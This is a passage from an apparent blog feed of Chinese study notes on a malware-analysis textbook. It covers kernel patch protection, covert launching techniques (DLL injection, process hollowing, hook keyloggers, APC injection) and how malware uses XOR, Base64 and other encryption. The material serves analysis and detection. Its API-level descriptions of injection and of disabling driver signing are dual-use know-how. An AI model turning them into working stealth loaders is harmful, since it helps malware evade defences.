Register Service和 Start Service就可以启动驱动。</p><h2 id="10x8-Windows-vista、-Windows7和x64版本的内核问题"><a href="#10x8-Windows-vista、-Windows7和x64版本的内核问题" class="headerlink" title="10x8 Windows vista、 Windows7和x64版本的内核问题"></a>10x8 Windows vista、 Windows7和x64版本的内核问题</h2><p>Vista及之后的Windows版本使用一个名为BCDEdit的程序来编辑引导配置数据，因此你可以在新版本的Windows操作系统中，使用BCDEdit开启内核调试。</p><p>在安全方面，最大的改变是使用了一种内核保护补丁机制，通常被称为PatchGuard，这种机制从Windows XP开始在x64系统上实施。内核补丁保护能够阻止第三方程序修改内核，这包括修改内核代码自身、修改系统服务表、修改IDT以及其他补丁修改技术。引入这种功能时存在一定程度上的争议，因为不仅恶意程序使用内核补丁，正常程序也使用它。</p><p>同时，在64位系统中，内核补丁保护也能干扰调试过程，因为调试器在插入断点时会修改代码。因此．如果内核调试器在系统引导时附加到系统的话，补丁保护将不会运行。如果系统引导结束后再将内核调试器附加到系统．PatchGuard将会使系统崩溃。</p><p>从64位版本的Vista开始．Windows强制执行驱动签名机制，这也就意味着在没有数字签名的情况下，你不能将驱动加载到Windows Vista系统中。因为恶意代码通常不会使用数字签名，所以这是一种对抗恶意内核驱动的有效安全措施。事实上．x64系统上的恶意内核驱动实际上还不存在，但是随着x64版本的Windows越来越普及，恶意代码无疑将会解决这一个障碍。如果你需要加载一个未签名的驱动到x64的Vista系统中，你可以使用BCDEdit工具去修改引导项。具体来说就是将要求驱动签名的功能关闭，即关闭nointegritychecks。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;第10章-使用WinDbg调试内核&quot;&gt;&lt;a href=&quot;#第10章-使用WinDbg调试内核&quot; class=&quot;headerlink&quot; title=&quot;第10章  使用WinDbg调试内核&quot;&gt;&lt;/a&gt;第10章 </summary>
        
      
    
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
    <category term="第三篇 动态分析高级技术篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%B8%89%E7%AF%87-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第12章  隐蔽的恶意代码启动</title>
    <link href="https://kabeor.github.io/%E7%AC%AC12%E7%AB%A0%20%20%E9%9A%90%E8%94%BD%E7%9A%84%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%90%AF%E5%8A%A8/"/>
    <id>https://kabeor.github.io/%E7%AC%AC12%E7%AB%A0%20%20%E9%9A%90%E8%94%BD%E7%9A%84%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%90%AF%E5%8A%A8/</id>
    <published>2018-09-01T16:00:00.000Z</published>
    <updated>2020-03-16T04:25:47.559Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第12章-隐蔽的恶意代码启动"><a href="#第12章-隐蔽的恶意代码启动" class="headerlink" title="第12章  隐蔽的恶意代码启动"></a>第12章  隐蔽的恶意代码启动</h1><h2 id="12x1-启动器（Launcher）"><a href="#12x1-启动器（Launcher）" class="headerlink" title="12x1 启动器（Launcher）"></a>12x1 启动器（Launcher）</h2><p>启动器（也称为加载器）是一种设置自身或其他恶意代码片段以达到即时或将来秘密运行的恶意代码。启动器的目的是安装一些东西，以使恶意行为对用户隐藏。</p><p>启动器经常包含它要加载的恶意代码。最常见的情况是在它的资源节中包含一个可执行文件或者DLL。正常情况下，Windows PE文件格式中的资源节是供可执行程序使用的，但并不应该是可执行程序的组成代码。正常资源节的内容包括图标、图片、菜单以及字符串。启动器通常在资源节存储恶意代码，当启动器运行时，它在运行嵌入的可执行程序或者DLL程序之前，从资源节将恶意代码提取出来。</p><p>恶意代码启动器通常需要以管理员权限运行，或者通过提权拥有这些权限。普通的用户进程不能执行本章讨论的技术。事实上，启动器可能会包含一些提权代码，这提供了识别启动器的另一种方法。</p><h2 id="12x2-进程注入"><a href="#12x2-进程注入" class="headerlink" title="12x2 进程注入"></a>12x2 进程注入</h2><p>隐藏启动的最流行技术是进程注入。顾名思义，这种技术是将代码注入到另外一个正在运行的进程中，而被注入的进程会不知不觉地运行注入的代码。恶意代码编写者试图通过进程注入技术隐藏代码的行为，有时他们也试图使用这种技术绕过基于主机的防火墙和那些针对进程的安全机制。</p><p>VirtualAllocEx函数用来在另外一个进程中分配一块内存空间。WriteProcessMemory函数用来向VirtualAllocEx函数分配的地址空间写数据。</p><h3 id="1-DLL注入"><a href="#1-DLL注入" class="headerlink" title="1. DLL注入"></a>1. DLL注入</h3><p>DLL注入将代码注入到一个远程进程，并让远程进程调用LoadLibrary，从而强制远程进程加载一个DLL程序到它的进程上下文。一旦被感染的进程加载了恶意DLL程序，OS会自动地调用DLLMain函数，DLLMain函数由这个DLL程序的作者编写。这个函数包含的代码拥有与被注入进程访问系统的相同权限。通常情况下，恶意DLL程序除了DLLMain函数之外，拥有很少的内容，并且它所做的任何操作看起来似乎都来自于被感染的进程。</p><p>为了将恶意DLL注入到一个主机进程，启动器恶意代码必须获取受害进程的句柄。最常用的方法是使用Windows API函数CreateToolhelp32Snapshot、Process32First和Process32Next，来查找进程列表中的目标进程。一旦发现目标进程，启动器会提取目标进程的进程标识（PID），然后用提取的PID调用OpenProcess，以获取目标进程的句柄。</p><p>DLL注入使用CreateRemoteThread函数，这个函数可以让启动器恶意代码在远程进程中创建并运行一个新的线程。使用CreateRemoteThread时，需要传入三个比较重要的参数：OpenProcess函数获得的进程句柄（hProcess），注入线程的入口点（lpStartAddress）以及线程的参数（hpParameter）。例如，线程的入口点可能被设置为Loadlibrary函数的地址，并且恶意DLL名字作为它的参数。这会触发受害进程用恶意DLL名字作为参数调用LoadLibrary，因此恶意DLL就可以加载到受害进程中（假设LoadLibrary函数在受害进程的内存空间中有效，并且恶意DLL的名字字符串存在于同一个进程空间）。</p><p>恶意代码编写者通常使用函数VirtualAllocEx，为恶意动态库的名字字符串创建内存空间。如果提供远程进程的句柄，VirtualAllocEx函数将在远程进程中分配内存空间。</p><p>调用CreateRemoteThread之前，调用的最后一个函数是WriteProcessMemory。这个函数将恶意DLL程序的名字字符串写入到VirtualAllocEx分配的内存空间中。</p><h3 id="2-直接注入"><a href="#2-直接注入" class="headerlink" title="2. 直接注入"></a>2. 直接注入</h3><p>同DLL注入一样，直接注入也涉及在远程进程的内存空间中分配和插入代码。直接注入同DLL注入类似，它们都使用了许多相同的WindowsAPI函数。不同的是，它并不用单独编写一个DLL并且强制远程进程载入它，而是直接将恶意代码注入到远程进程中。</p><p>直接注入比DLL注入更加灵活，但是要想注入的代码在不对宿主进程产生副作用的前提下成功运行，直接注入需要大量的定制代码。这种技术可以被用来注入编译过的代码，但更多的时候，它用来注入shellcode.</p><p>直接注入比DLL注入更加灵活，但是要想注入的代码在不对宿主进程产生副作用的前提下成功运行，直接注入需要大量的定制代码。这种技术可以被用来注入编译过的代码，但更多的时候，它用来注入shellcode.</p><p>在应用直接注入技术的恶意代码中，经常会发现如下三个函数：VirtualAllocEx、writeProcessMenory和CreateRemoteThread。通常会有两次virtualAllocEx和WriteProcessMemory调用。第一次调用是分配内存空间并写入远程线程使用的数据。第二次调用分配内存空间并且写入远程线程代码。CreateRemoteThread调用包含远程线程代码的位置（lpStartAddress）和数据（lpParameter）。</p><p>由于远程线程使用的数据和函数都必须位于受害进程空间内，所以正常编译的程序都无法工作。例如，字符串不在正常的.data段中，需要调用函数LoadLibrary/GetProcAddress来访问未载入的函数。另外，还有一些其他的限制，但我们在这里不做深入探究。基本上，直接注入技术要求恶意代码编写者或者精通汇编语言代码，或者是仅仅注入相对简单的shellcode。</p><p>要分析远程线程的代码，你可能需要调试恶意代码，并且在反汇编器中，转储WriteprocessMemory调用发生前所有的内存缓存区，以便进行分析。由于这些缓存区经常包含shellcode，因此你需要掌握shellcode分析技巧.</p><h2 id="12x3-进程替换"><a href="#12x3-进程替换" class="headerlink" title="12x3 进程替换"></a>12x3 进程替换</h2><p>除了注入代码到一个宿主程序外，一些恶意代码还会使用一种被称为进程替换方法，将一个可执行文件重写到一个运行进程的内存空间。当恶意代码编写者想要将恶意代码伪装成一个合法进程，并且不会产生DLL注入让进程崩溃的危险时，他们会使用进程替换技术。</p><p>这种技术让恶意代码与被替换进程拥有相同的特权级。例如，如果一段恶意代码执行了一次针对进程svchost.exe的进程替换攻击，用户会看到一个名为svchost.exe的进程从C:Windows\System32目录中启动，并很可能认为它没有什么风险（这是一种常见的恶意代码攻击方式）。</p><p>进程替换的关键是以挂起状态创建一个进程。这也就意味着这个进程将会被载入内存，但是它的主线程被挂起。在外部的程序恢复主线程之前，这个程序将不做任何事情，恢复主线程后，才开始执行。</p><p>一旦进程被创建，接下来就要用恶意的可执行文件替换受害进程的内存空间，通常会使用函数ZwUnmapViewofSection来释放由参数指向的所有内存。解除内存映射之后，加载器通常执行函数VirtualAllocEx为恶意代码分配新的内存，并且用函数WriteProcessMemory将恶意代码的每个段写入到受害进程的内存空间，这些操作常在一个循环中进行。</p><p>最后一步，恶意代码恢复受害进程的环境，通过调用SetThreadContext函数，让入口点指向恶意的代码，让其获得运行。最后，调用ResumeThread函数，初始化恶意代码并进行执行，而此时它已经替换了受害进程。</p><p>进程替换是恶意代码伪装成非恶意程序的一种有效方法。通过伪装成受害进程，恶意代码可以绕过防火墙和入侵防御系统（IPS），并且使它看起来像正常的Windows进程，从而让它逃避探测。</p><p>此外，通过使用原始的二进制路径，恶意代码还可以欺骗精明的用户，当查看进程列表时，他们只能看到执行是已知、有效的二进制程序，而并不会意识到它已经被解除了映射，并被替换成了恶意程序。</p><h2 id="12x4-钩子-Hook-注入"><a href="#12x4-钩子-Hook-注入" class="headerlink" title="12x4 钩子(Hook)注入"></a>12x4 钩子(Hook)注入</h2><p>钩子注入是一种利用Windows钩子（Hook）加载恶意代码的方法，恶意代码用它拦截发往某个应用程序的消息。恶意代码编写者可以用挂钩注入，来完成以下两种事情。</p><ol><li>保证无论何时拦截到一个特殊消息，恶意代码都会被运行。</li><li>保证一个特殊的DLL被载入到受害进程的内存空间。</li></ol><h3 id="1-本地和远程钩子（Hook）"><a href="#1-本地和远程钩子（Hook）" class="headerlink" title="1. 本地和远程钩子（Hook）"></a>1. 本地和远程钩子（Hook）</h3><p>有两种类型的Windows钩子：</p><ol><li>本地钩子被用来观察和操纵发往进程内部的消息。</li><li>远程钩子被用来观察和操纵发往一个远程进程的消息（系统中的另一个进程）。</li></ol><p>远程钩子有两种形式：上层和底层。上层的远程挂钩要求钩子例程是DLL程序的一个导出函数。它被操作系统映射到被挂钩线程或者系统所有线程的进程地址空间。底层远程钩子则要求钩子例程被保护在安装钩子的进程中。这个例程在操作系统获得处理事件的机会前被通知。</p><h3 id="2-使用钩子的击键记录器"><a href="#2-使用钩子的击键记录器" class="headerlink" title="2. 使用钩子的击键记录器"></a>2. 使用钩子的击键记录器</h3><p>钩子注入常被一种叫做击键记录器的恶意程序所使用，被用来记录击键。击键可以分别使用WH_KEYBOARD和WH_KEYBOARD_LL钩子例程类型，来注册上层和底层的钩子。</p><p>对于WH_KEYBOARD例程，钩子通常运行在远程进程的上下文空间中，也可以运行在安装钩子的进程空间中。对于WH_KEYBOARD_LL例程，事件直接发送到安装钩子的进程，所以钩子运行在创建钩子的进程中。无论使用哪种钩子类型，击键记录器都可以截获击键，并且在传递到进程或者系统之前，把它们记录到文件或是修改。</p><h3 id="3-使用SetWindowsHookEx"><a href="#3-使用SetWindowsHookEx" class="headerlink" title="3. 使用SetWindowsHookEx"></a>3. 使用SetWindowsHookEx</h3><p>用来执行远程Windows挂钩的主要函数是SetwindowsHookEx，它拥有如下参数：</p><ol><li>idHook 指定要安装的钩子例程的类型。</li><li>lpfn钩子例程指针。</li><li>hMod对于上层的钩子，它来标识包含lpfn定义的钩子例程的DLL句柄。对于底层钩子，它来标识包含1pfn例程的本地模块句柄。</li><li>dwThreadId 指定与钩子例程关联的线程标识，如果这个参数为0，则挂钩例程将绑定与调用线程同在一个桌面的所有线程。当为底层钩子时必须被设置为0。</li></ol><p>钩子例程可以包含处理消息（当它们从系统产生后）的代码，也可以什么也不做。无论如何，钩子例程都必须调用CallNextHookEx，这可以保证调用链中下一个钩子例程能够得到消息，并且保证系统继续正常运行。</p><h3 id="4-目标线程"><a href="#4-目标线程" class="headerlink" title="4. 目标线程"></a>4. 目标线程</h3><p>当制定dwThreadId时，恶意代码通常决定载入到dw某个系统线程，或者载入到所有线程。也就是说，仅当它是击键记录器或者类似的程序时，恶意代码才载入到所有线程（目的是拦截消息）。然而，载入到所有的线程会降低系统的运行速度，并且可能触发入侵防护系统。因此，如果是简单载入一个DLL到远程进程，则注入单个线程会保持恶意代码的隐蔽性。</p><p>指定单线程为目标，要求查找进程列表中的目标进程，如果碰到目标进程没有运行，恶意代码要先启动它。如果一个恶意的应用程序挂钩了一个经常使用的Windows消息，它很有可能会触发入侵防御系统，所以恶意代码通常会挂钩一个不常使用的消息，如WH_CBT（一个用于计算机训练的消息）。</p><h2 id="12x5-Detours"><a href="#12x5-Detours" class="headerlink" title="12x5 Detours"></a>12x5 Detours</h2><p>Detours是微软研究院1999年开发的一个代码库。它的初衷是作为一个来扩展已有操作系统和应用程序功能的简单工具。Detours开发库让开发人员对二进制应用程序进行修改变得简单可行。</p><p>同样，恶意代码编写者也喜欢Detours库，他们使用Detours库执行对导入表的修改，挂载DLL到已有程序文件，并且向运行的进程添加函数钩子等。</p><p>恶意代码编写者最常使用Detours库，来添加一个新的DLL到硬盘上的二进制文件。恶意代码修改PE结构，并且创建一个名为.detour的段，它通常位于导出表和调试符号之间。.detour段在新的导入地址表中包含了原始的PE头部。使用Detours库提供的setdll工具，恶意代码编写者修改PE头部，使其指向新的导入表。</p><h2 id="12x6-APC注入"><a href="#12x6-APC注入" class="headerlink" title="12x6 APC注入"></a>12x6 APC注入</h2><p>在本章的前面，我们看到通过CreateRemoteThread函数创建一个线程就可以使用远程进程中的一个函数。然而，线程创建需要系统开销，所以调用一个现有的线程会更加高效。Windows的异步过程调用（APC）可以满足这种要求。</p><p>APC可以让一个线程在它正常的执行路径运行之前执行一些其他的代码。每一个线程都有一个附加的APC队列，它们在线程处于可警告的等待状态时被处理。例如它们调用如WaitForSingleObjectEx、waitForMultipleobjectsEx和SleepEx函数等。实质上，这些函数给了线程一个处理等待APC的机会。</p><p>如果应用程序在线程可警告等待状态时（未运行之前）排入一个APC队列，那么线程将从调用APC函数开始。线程逐个调用APC队列中的所有APC。当APC队列完成时，线程才继续沿着它规定的路径执行。恶意代码编写者为了让他们的代码立即获得执行，他们用APC抢占可警告等待状态的线程。</p><p>APC有两种存在形式：</p><ol><li>为系统或者驱动生成的APC，被称为内核模式APC。</li><li>为应用程序生成的APC，被称为用户模式APC。<br>恶意代码可以使用APC注入技术，让内核空间或者用户空间中生成用户模式的APC.</li></ol><h3 id="1-用户模式下APC注入"><a href="#1-用户模式下APC注入" class="headerlink" title="1. 用户模式下APC注入"></a>1. 用户模式下APC注入</h3><p>线程可以使用API函数QueueUserAPC排入一个让远程线程调用的函数。运行用户模式的APC要求线程必须处于可警告等待状态，因此恶意代码会查看进程中是否有可能进入这个状态的目标线程。幸运的是，对恶意代码分析师来说，WaitForSingleObjectEx是最常使用的Windows API调用，并且有很多处于可警告等待状态的线程。</p><p>让我们来检查一下QueueUserAPC的参数：pfnAPC、hThread以及dwData。QueueUserAPC要求句柄为hThread的线程使用参数dwData运行pfnAPC定义的函数。</p><blockquote><p>注意：分析过程中，你可以通过查找恶意代码查询目标进程的API调用，如Create Toolhelp32Snapshot、Process32First和Process32Next 来发现目标线程的代码。在这些代码之后的经常是Thread32First和Thread32Next调用，它们通常被包含在一个在目标进程中查找目标线程的循环中。另外，恶意代码也会利用参数SYSTEM_PROCESS_INFORMATION调用Nt/ZwQuerySystemlnformation来发现目标进程。</p></blockquote><h3 id="2-内核模式的APC注入"><a href="#2-内核模式的APC注入" class="headerlink" title="2. 内核模式的APC注入"></a>2. 内核模式的APC注入</h3><p>恶意代码驱动和Rootkit也常常希望在用户空间中执行代码，但是对它们来说这样做并不容易。一种方法是在内核空间执行APC注入。恶意的驱动可创建一个APC，然后分配用户模式进程中的一个线程（最常见的是suchost.exe）运行它。这种类型APC通常由shellcode组成。</p><p>设备驱动利用两个主要的函数来使用APC: KeInitializeApc和KeInsertQueueApc.</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;第12章-隐蔽的恶意代码启动&quot;&gt;&lt;a href=&quot;#第12章-隐蔽的恶意代码启动&quot; class=&quot;headerlink&quot; title=&quot;第12章  隐蔽的恶意代码启动&quot;&gt;&lt;/a&gt;第12章  隐蔽的恶意代码启动&lt;/h1&gt;&lt;h2</summary>
        
      
    
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
    <category term="第四篇 恶意代码功能篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E5%9B%9B%E7%AF%87-%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%8A%9F%E8%83%BD%E7%AF%87/"/>
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第13章  数据加密</title>
    <link href="https://kabeor.github.io/%E7%AC%AC13%E7%AB%A0%20%20%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/"/>
    <id>https://kabeor.github.io/%E7%AC%AC13%E7%AB%A0%20%20%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/</id>
    <published>2018-09-01T16:00:00.000Z</published>
    <updated>2020-03-16T04:25:54.123Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第13章-数据加密"><a href="#第13章-数据加密" class="headerlink" title="第13章  数据加密"></a>第13章  数据加密</h1><h2 id="13x1-分析加密算法的目的"><a href="#13x1-分析加密算法的目的" class="headerlink" title="13x1 分析加密算法的目的"></a>13x1 分析加密算法的目的</h2><p>恶意代码用加密来达到各种各样的目的。最常见的是加密网络通信，同时，恶意代码也会用加密来隐藏它的内部工作。例如，恶意代码编写者可能因为如下目的而使用加密：</p><blockquote><p>·隐藏配置信息。例如，命令和控制服务器域名。<br>·窃取信息之前将它保存到一个临时文件。<br>·存储需要使用的字符串，并在使用前对其解密。<br>·将恶意代码伪装成一个合法的工具，隐藏恶意代码活动中使用的字符串。</p></blockquote><p>分析加密算法时，我们的目标由两部分组成:识别加密算法，然后根据识别的加密算法解密攻击者的秘密。</p><h2 id="13x2-简单的加密算法"><a href="#13x2-简单的加密算法" class="headerlink" title="13x2 简单的加密算法"></a>13x2 简单的加密算法</h2><h3 id="1-凯撒密码"><a href="#1-凯撒密码" class="headerlink" title="1. 凯撒密码"></a>1. 凯撒密码</h3><h3 id="2-XOR"><a href="#2-XOR" class="headerlink" title="2. XOR"></a>2. XOR</h3><p>XOR加密使用一个静态字节值，通过与该值执行逻辑异或运算来修改明文中的每个字节。</p><blockquote><p>暴力破解XOR加密</p></blockquote><p>由于文件中的每个字符只有256种可能的值，对于一个计算机来说很容易并且能够足够快地使用255个单字节密钥来异或文件头部，然后将输出与期望的可执行文件头部进行比较。可以使用一个脚本来执行用255个密钥的XOR加密。</p><blockquote><p>保留NULL的单字节XOR加密</p></blockquote><p>单字节加密的一个漏洞：它对使用十六进制编辑器手动扫描加密内容的用户缺乏有效的隐蔽性。如果加密内容中有大量的NULL字节，那么单字节密钥变得十分明显。</p><p>与标准的XOR加密策略不同，保留NULL的单字节XOR加密策略有两个例外。</p><ol><li>如果明文中字符是NULL或者密钥本身，则被跳过。</li><li>如果明文中字符既不是NULL也不是密码本身，则将被使用XOR密钥加密。</li></ol><p><a href="https://i.loli.net/2018/08/31/5b88f4d7dc022.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/08/31/5b88f4d7dc022.jpg" class="lazyload"></a></p><h4 id="用IDA-Pro识别XOR循环"><a href="#用IDA-Pro识别XOR循环" class="headerlink" title="用IDA Pro识别XOR循环"></a>用IDA Pro识别XOR循环</h4><p>在反汇编中，通过循环语句中间使用XOR指令的小循环语句找到了XOR循环。用IDA Pro找到XOR循环的一个最简单方法是搜索指令中XOR指令，如下：<br>1.确保你正在查看代码（窗口的标题应该包含“IDAView”）。<br>2.选择Search→Text。<br>3.在文本搜索对话框中输入xor，选中Find all occurrences复选框，然后单击OK按钮。</p><p>搜索到XOR指令并不意味着它一定用于加密。XOR指令可以用于不同的目的，其用途之一就是清空寄存器的内容。XOR指令以三种形式存在。</p><ol><li>用寄存器自身XOR。</li><li>用一个常量（或一个内存引用）XOR。</li><li>使用一个不同寄存器（或一个内存引用）XOR。</li></ol><p>最常见的是第一种形式，因为寄存器与自身异或是清零寄存器的一种有效方式。幸运的是，清零寄存器与数据加密无关，所以可以忽略它。</p><p>XOR加密循环可能使用另外两种形式中的一种：用一个常量异或一个寄存器，或者用一个不同的寄存器异或一个寄存器。如果你幸运，XOR加密是一个常量异或寄存器的XOR，因为通过它，可以确认你可能发现了加密，并且也可以知道密钥。</p><p>加密的迹象之一就是含有一个包含XOR函数的嵌套循环。</p><h3 id="3-其他一些简单的加密策略"><a href="#3-其他一些简单的加密策略" class="headerlink" title="3. 其他一些简单的加密策略"></a>3. 其他一些简单的加密策略</h3><p><a href="https://i.loli.net/2018/08/31/5b88f66b1a17f.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/08/31/5b88f66b1a17f.jpg" class="lazyload"></a></p><h3 id="4-Base64"><a href="#4-Base64" class="headerlink" title="4. Base64"></a>4. Base64</h3><p>术语Base64来自于多用途Internet邮件扩展（MIME）标准。虽然Base64最初用于加密传输的邮件附件，但是现在它却广泛用于HTTP和XML。</p><p>Base64编码将二进制数据转换成64个字符的有限字符集。对于不同类型的Base64加密，有多种不同的策略或字母表。但是它们都使用64个主要的字符，另外，它们通常用一个额外字符表示填充，通常是“=”。</p><p>最常用的字符集是MIME Base64，它使用A<del>Z、a</del>z和0~9作为前62个值，+和/作为最后两个值。由于需要将数据压缩成一个较小字符集，给Base64加密后的数据会比原始的数据长。对于3个字节的二进制文件，加密后是至少4个字节的Base64加密数据。</p><blockquote><p>数据转化成Base64</p></blockquote><p>原始数据转换成Base64的过程相当标准。它使用24位（3个字节）的块。第一个字符被放到最重要的位置，第二个字符放在中间的8位，第三个字符放在最不重要的后8位。接下来，从最重要位置的开始，位被读入到6个块中。</p><p><a href="https://i.loli.net/2018/08/31/5b88f7ca698a5.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/08/31/5b88f7ca698a5.jpg" class="lazyload"></a></p><p>上图展示转换发生的过程，最上面一行是原始的字符串（ATT）。第二行是ATT的半字节表示（半字节等于4位）。中间一行用来表示ATT的实际位。第四行以6位段十进制表示位值。最后，最终的字符串通过十进制索引参考字符串得出字符。</p><p>由上图可见，字母A相应的比特位是01000001。A字母的前6位被转换成Base64加密的单字符Q。字母A的最后两位（01）和字母T前四位（0101）被转化成Base64加密的第二个字符V（010101）。</p><p>将Base64解密成原始的数据遵循相同的过程，但是过程是相反的。首先将每个Base64字符转换成6个比特位，将所有比特位按顺序存放。然后，以八位一组读取比特位，每组8个比特位表示原始数据的字节。</p><blockquote><p>识别和解密Base64</p></blockquote><p>在技术上，填充字符是可选的，并且它们对解密的准确性不是必须的。恶意代码知道避免使用这种填充字符，想必是为了使它们看起来不像Base64编码并避免网络特征。</p><p>因为Base64加密的实现通常使用索引字符串，含有Base64加密的代码经常会存在这个64字符组成的加密字符串。通常情况下，索引Base64的字符串由可打印字符组成（或者它会破坏该算法的意图），因此可以很容易用眼睛察觉字符串输出。</p><p>第二个可以被用来确认使用Base64加密算法的证据是存在一个单独填充字符（常为“=”），这个单独的填充字符常被硬编码到执行加密的函数中。</p><h2 id="13x3-常见的加密算法"><a href="#13x3-常见的加密算法" class="headerlink" title="13x3 常见的加密算法"></a>13x3 常见的加密算法</h2><p>简单的加密算法与现代的加密算法不同，它们等同于替换算法。现代的加密算法考虑了增加指数级的计算能力，并且确保设计的算法需要大量的计算能力，从而使破解它们不切实际。</p><p>先前我们讨论的简单加密策略并不试图对暴力破解方法加以保护，它们的主要目的是隐藏。随着时间的推移，加密算法逐渐改进和发展，并且它们已经深入到计算机应用的各个方面，例如网页浏览器中的SSL，无线接入点使用的加密等等。那么，为什么恶意代码不使用这种加密算法来隐藏敏感信息呢？恶意代码使用简单的加密策略是因为它们容易且足够使用。此外，使用标准的加密存在一些潜在的漏洞，特别是对于恶意代码来说：</p><ol><li>加密库很大，所以恶意代码需要静态的集成或者链接到已有的代码中。</li><li>链接主机上现有的代码可能降低可移植性。</li><li>标准加密库比较容易探测（通过函数导入，函数匹配或者加密常量标识）。</li><li>对称加密算法需要考虑如何隐藏密钥。</li></ol><p>很多标准加密算法都依赖于一个强大的密钥来存储它们的秘密。算法本身是公开的，但是如果没有密钥，几乎不可能（也就说它需要大量工作）破解加密的密文。要确保解密费时费力，通常情况下，密钥必须足够长从而使得测试所有可能的密钥不那么容易。对于恶意代码可能使用的标准加密算法，关键是不仅要识别加密算法，而且还要识别密钥。</p><p>有一些简单方法可以识别标准加密。它们包括查找字符串和引用加密函数的导入，使用一些工具寻找特定的内容。</p><h3 id="1-识别字符串和导入"><a href="#1-识别字符串和导入" class="headerlink" title="1. 识别字符串和导入"></a>1. 识别字符串和导入</h3><p>一种识别标准加密算法的方法是识别涉及加密算法使用的字符串。当加密库（如OpenSSL）被静态地编译到恶意代码时，这种情况便会发生。</p><p>另外一种查找标准加密算法的方法是识别引用导入的加密函数。</p><h3 id="2-查找加密常量"><a href="#2-查找加密常量" class="headerlink" title="2. 查找加密常量"></a>2. 查找加密常量</h3><p>第三种检测加密的基本方法是使用可以搜索常见加密常量的工具，这里，我们使用IDA Pro的FindCrypt2和Krypto ANALyzer插件。</p><blockquote><p>使用FindCrypt2</p></blockquote><p>IDAPro有一个叫做FindCrypt2插件，包含在IDAPro的SDK中，它搜索程序中任何与加密算法相关的已知常量。这样做效果很好，因为多数加密算法会使用一些神秘的常量类型。所谓神秘常量则是与基本加密算法结构相关的一些固定位串。</p><p><strong><em>注意：一些加密算法并不使用神秘常量，值得注意的是，国际数据加密（IDEA）算法和RC4算法动态地创建它们的结构，因此它们不在可识别的算法之中。恶意代码常使用RC4算法，因为它体积小，在软件中易于实现，并且没有明显的加密常量。</em></strong></p><p>与IDAPRO的插件FindCrypt2原理相同的一个工具是Krypto ANALyzer（KANAL）。KANAL是PEiD的一个插件，它拥有一个范围更广的常量集合（作为结果可能更加容易产生误报）。除此之外，KANAL还能够识别Base64编码表以及加密相关的导入函数。</p><h3 id="3-查找高熵值内容"><a href="#3-查找高熵值内容" class="headerlink" title="3. 查找高熵值内容"></a>3. 查找高熵值内容</h3><p>识别加密算法的另一方法是查找高熵值的内容。除了识别潜在的明显的加密常量或者加密密钥外，这种技术也可以识别加密内容本身。由于这种技术的影响广泛，可以适用于没有找到加密常量的地方（如RC4）。</p><p><strong><em>警告：高嫡内容技术相当迟钝，最好作为最后一种使用手段。多种类型的内容，如图片、电影、音频文件以及其他压缩数据等，也会显示高篇值，除了它们的头部特征之外，很难与加密内容进行区分。</em></strong></p><p>IDA的熵值插件(<a href="http://www.smokedchicken.org/2010/06/idaentropy-plugin.html" target="_blank" rel="noopener">http://www.smokedchicken.org/2010/06/idaentropy-plugin.html</a> )是针对PE文件使用这种技术的一个工具。将ida-entplw文件放置到IDAPro的插件目录，就可以将这个插件载入到IDA Pro。</p><p>包含64个不同字节值的64字节字符串拥有最高可能的熵值，这64个值与熵值6相关（指6比特位的熵），因为6比特位表示的数字是64。</p><p>另外一种可能有用的设置是大小为256的块，其熵值大于7.9。这也意味一个256个连续字节的字符串几乎反应出所有256个可能的字节值。</p><p>IDAPro的熵值插件还有一个提供图形化概览感兴趣区域的工具，可以用它来引导你选择最大熵评分值，同时也帮助你确定关注范围。绘图按钮产生一个图，它将高熵值区域显示为亮条，将低熵值区域显示为暗条。在图上移动鼠标光标，可以看到图中某些点的原始熵值。因为熵的地图在打印格式下很难准确表达。</p><h2 